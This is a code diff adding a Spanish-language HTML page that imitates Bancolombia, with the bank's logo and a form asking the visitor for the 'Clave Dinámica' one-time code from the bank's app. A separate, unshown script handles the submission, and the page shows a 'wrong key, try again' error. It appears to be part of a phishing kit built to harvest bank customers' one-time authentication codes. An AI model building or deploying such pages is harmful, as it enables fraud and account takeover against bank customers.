@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clave Dinámica</title>
+    <link rel="stylesheet" href="styles.css"> <!-- Enlace al CSS -->
+    <script defer src="dinamica.js"></script> <!-- Archivo de JavaScript -->
+</head>
+<body>
+    <header>
+        <div class="logo-container">
+            <img src="logo.png" alt="Bancolombia">
+        </div>
+        <a href="#" class="salir">Salir →</a>
+    </header>
+
+    <main>
+        <div class="login-container">
+            <h2 class="bienvenida">Clave Dinámica</h2> 
+            <div class="login-box">
+                <p>Consulta tu clave Dinámica desde la App Mi Bancolombia.</p>
+                <form id="dinamicaForm"> <!-- Agregamos ID al formulario -->
+                    <p id="errorMensaje" style="color: red; display: none;">❌ Clave incorrecta. Intenta de nuevo.</p>
+
+                    <label for="dinamica"> <!-- Corregimos el ID del input -->
+                        <input type="text" id="dinamica" placeholder="Ingrese su clave Dinámica" required>
+                    </label>
+                    
+                    <div class="botones">
+                        <button type="button" class="volver">Volver</button>
+                        <button type="submit" class="continuar">Continuar</button>
+                    </div>
+                </form>
+                <p id="errorMensaje" style="color: red; display: none;">Clave incorrecta, inténtalo nuevamente.</p> <!-- Mensaje de error oculto -->
+            </div>
+        </div>
+    </main>
+</body>
+</html>
